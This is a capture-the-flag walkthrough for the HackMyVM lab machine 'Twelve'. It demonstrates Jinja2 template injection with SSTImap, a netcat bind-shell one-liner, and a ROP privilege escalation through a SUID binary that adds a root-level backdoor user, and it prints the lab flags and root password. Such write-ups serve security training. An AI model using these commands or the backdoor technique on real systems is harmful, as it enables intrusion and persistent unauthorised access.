HackMyVM: Twelve - Complete Walkthrough
Machine Information
Name: Twelve

Difficulty: Easy/Medium

IP: 192.168.56.102

OS: Debian 12

Services: SSH (22), HTTP Apache (80), HTTP Werkzeug (1212)

1. Enumeration
1.1 Port Scanning
We begin with a full TCP port scan to discover open services.

bash
nmap -p- -sV -sC -T4 192.168.56.102
Results:

22/tcp - OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)

80/tcp - Apache httpd 2.4.66 ((Debian)) – default Debian Apache page

1212/tcp - Werkzeug httpd 2.2.2 Python/3.11.2 – "Base-12 Converter"

1.2 Web Enumeration
Port 80
Directory fuzzing reveals only default Apache files. Nothing interesting.

Port 1212 - Base-12 Converter
Visiting http://192.168.56.102:1212/ presents a simple web application that converts integers to base-12 representation. Input is passed via the num GET parameter, e.g.:

text
http://192.168.56.102:1212/?num=144
The response reflects the converted value. The Server header indicates Werkzeug/2.2.2 Python/3.11.2, suggesting a Python Flask-like application.

Testing for Werkzeug debugger RCE (CVE-2019-14322) fails—the debug console is not exposed.

2. Exploiting SSTI
Given that user input is reflected, we test for Server-Side Template Injection (SSTI). The application likely uses Jinja2 templating.

We use SSTImap to automate detection and exploitation.

2.1 SSTImap Detection
bash
git clone https://github.com/vladko312/SSTImap.git
cd SSTImap
pip3 install -r requirements.txt
python3 sstimap.py -u 'http://192.168.56.102:1212/?num=144' --os-shell
Output:

text
[+] Jinja2 plugin has confirmed injection with tag '*'
[+] SSTImap identified the following injection point:
  Query parameter: num
  Engine: Jinja2
  Injection: *
  Context: text
  OS: posix-linux
  Technique: rendered
  Capabilities:
    Shell command execution: ok
    ...
[+] Run commands on the operating system.
posix-linux $
2.2 Initial Access
From the posix-linux $ pseudo-shell we can run commands as www-data.

bash
posix-linux $ ls
app.py
posix-linux $ whoami
www-data
User Flag
bash
posix-linux $ cat /home/debian/user.txt
flag{user-8453eaca1baf2ad1abc7c17615fb8b91}
3. Upgrading to a Full TTY Shell
The SSTImap shell is stateless and non-interactive. We upgrade to a proper reverse/bind shell.

3.1 Netcat Bind Shell
On target (via SSTImap):

bash
posix-linux $ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -l -p 4444 >/tmp/f &
On Kali:

bash
nc 192.168.56.102 4444
We receive a dumb shell:

text
www-data@Twelve:/opt/twelve_app$
3.2 TTY Upgrade
bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Press Ctrl+Z to background
stty raw -echo; fg
export TERM=xterm
Now we have a fully interactive shell.

4. Privilege Escalation
4.1 SUID Enumeration
bash
find / -perm -4000 -type f 2>/dev/null
Notable entry:

text
/usr/local/bin/12
4.2 Analyzing /usr/local/bin/12
Running the binary interactively presents a menu:

text
Welcome to an easy Return Oriented Programming challenge...
Menu:
1) Get libc address
2) Get address of a libc function
3) Nom nom r0p buffer to stack
4) Exit
Vulnerability: The binary leaks libc addresses and allows arbitrary buffer input (option 3) that leads to a stack buffer overflow. This is a classic ROP challenge.

Leaking Addresses
Option 1 returns the runtime address of libc.so.6.

Option 2 with system returns the address of system().

With ASLR enabled, these leaks give us the dynamic libc base.

4.3 Exploit Development
We craft a ROP chain to call setuid(0) then system("/bin/sh").

Gadgets (libc 2.36 offsets):

pop rdi; ret: 0x27725

/bin/sh string: 0x196031

setuid: 0xd5370 (offset from libc base)

The Python exploit x.py automates the process:

python
import subprocess, struct, time

p64 = lambda x: struct.pack("<Q", x)

def ouba_exploit():
    target = '/usr/local/bin/12'
    proc = subprocess.Popen([target], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

    # ... communication helpers ...

    # Stage 1: Leak addresses
    # Stage 2: Build ROP chain (align_ret, pop_rdi; 0; setuid; pop_rdi; "/bin/sh"; system)
    # Stage 3: Send payload via option 3 with size header
    # Stage 4: Trigger via option 4
    # Stage 5: Add persistence user 'ouba' with root UID
4.4 Running the Exploit
bash
www-data@Twelve:/tmp$ python3 x.py
[+] Starting exploit for target: Twelve
[*] Stage 1: Leaking Libc Address via function 'system'
    [>] Libc Address (system): 0x7f6268552330
    [>] Calculated Libc Base : 0x7f6268506000
[*] Stage 2: Nom nom ROP buffer to stack
    [>] Payload injected (56 bytes)
[*] Stage 3: Triggering exploit via Menu 4 (Exit)
[!] Exploit successful! Establishing persistence...
uid=0(root) gid=33(www-data) groups=33(www-data)
root
[+] PERSISTENCE SUCCESS: User ouba created with pass pwned
The exploit executes id as root and creates a backdoor user ouba with UID 0 and password pwned.

4.5 Switching to Root
bash
www-data@Twelve:/tmp$ su ouba
Password: pwned
root@Twelve:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
Root Flag
bash
root@Twelve:/tmp# cat /root/root.txt
flag{root-a6127743d7835b6b4dd8debe12e9879a}
[rootpass: smokeylo]
The root password is also revealed: smokeylo.

5. Conclusion
Twelve demonstrates:

SSTI in Jinja2 leading to initial RCE.

Custom SUID binary with a classic info-leak + buffer overflow requiring a ROP chain to bypass ASLR and NX.

Flags:

User: flag{user-8453eaca1baf2ad1abc7c17615fb8b91}

Root: flag{root-a6127743d7835b6b4dd8debe12e9879a}

Root Password: smokeylo

5.1 Mitigations
Sanitize user input in templates (use safe rendering).

Avoid SUID binaries that leak memory addresses; implement stack canaries and PIE.

Restrict /etc/passwd write access.

6. References
SSTImap

HackMyVM
